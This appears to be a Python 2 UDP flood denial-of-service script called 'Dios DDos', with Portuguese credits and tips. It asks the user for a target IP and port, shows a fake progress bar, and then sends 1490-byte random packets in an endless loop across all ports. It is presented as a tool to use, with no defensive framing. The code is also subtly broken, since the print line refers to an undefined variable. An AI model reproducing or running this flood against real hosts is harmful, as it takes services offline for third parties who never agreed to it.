import sys
import os
import time
import socket
import random
#dios ddos
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
############

os.system("clear")
os.system("figlet Dios DDos")
print "  https://github.com/DiosDeLaWeb/Dios-DDos"
print
print "codder by: dios de la web   #dono do script"
print "new team 404                #melhor team hacker"
print "dios ddos attack on         #teste sites"
print "use comando ping            #como pegar ip"
print "insira o ip alvo abaixo     #dica dios"
print "logo depois coloque o port  #port sugerido (80)"
print

ip = raw_input("IP Alvo :")
port = input("Port       :")

os.system("clear")
os.system("figlet ddos go")
print "[                    ] 0% "
time.sleep(5)
print "[>>>>>               ] 25% "
time.sleep(5)
print "[>>>>>>>>>>          ] 50% "
time.sleep(5)
print "[>>>>>>>>>>>>>>>     ] 75% "
time.sleep(5)
print "[>>>>>>>>>>>>>>>>>>>>] 100% "
time.sleep(3)
send = 0
while True:
    sock.sendto(bytes, (ip,port))
    send = send + 1
    port = port + 1
    print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
    if port == 65534:
        port = 1
